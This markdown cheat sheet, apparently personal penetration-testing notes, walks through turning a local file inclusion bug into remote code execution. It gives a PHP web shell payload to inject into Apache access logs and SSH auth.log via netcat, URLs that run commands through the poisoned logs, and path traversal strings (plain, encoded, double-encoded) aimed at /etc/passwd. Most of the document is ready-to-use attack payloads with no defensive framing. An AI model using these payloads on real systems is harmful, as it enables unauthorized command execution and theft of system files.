# LFI

If you locate an LFI, first try to get RCE.

### 1) Locate a writable log file

    /var/log/apache2/access.log

### 2) Inject a payload

Inject a simple web shell payload into a request header (e.g., User-Agent or Referer) that the web server will log.

Payload:

    <?php echo system($_GET['cmd']); ?>

### 3) Execute via LFI

    http://example.com/vulnerable.php?page=/path/to/log/access.log&cmd=whoami

## Alternate poisoning method: SSH Log Poisoning

### 1) Locate the log file

    /var/log/auth.log

### 2) Poison the auth.log file

Connect to SSH port via netcat

    nc -nv IP 22

Inject payload

    <?php echo system($_GET['cmd']); ?>

### 3) Run commands via your webshell now

    http://domain.local/lfi.php?file=/var/log/auth.log?cmd=whoami

## Path Traversal manual payloads

Simple traversal: start with 

    ../../../../etc/passwd 

Try variants like : 

    ..//..//..//etc/passwd 
    
or 

    ..\/..\/..\/etc/passwd.

Dot+slash permutations: 

    ..././../ 
    
or 

    ..%2f..%2f..%2fetc/passwd (URL encoded).

Try Double-encoding: 

URL-encode twice if the app decodes input more than once (example: %252e%252e%252f = %2e%2e%2f).
